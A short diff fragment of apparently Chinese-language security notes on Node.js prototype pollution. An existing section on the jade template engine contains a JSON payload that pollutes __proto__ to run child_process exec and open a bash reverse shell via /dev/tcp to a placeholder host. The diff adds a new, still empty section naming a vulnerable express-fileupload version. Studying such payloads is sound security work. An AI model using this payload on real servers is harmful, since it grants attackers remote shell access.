@@ -258,3 +258,10 @@ package.json中存在jade。
 ```
 {"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/810>&1\"')"}}}
 ```
+
+
+^
+## **express-fileupload原型链污染**
+"express-fileupload": "1.1.7-alpha.4"存在cve。
+```
+```
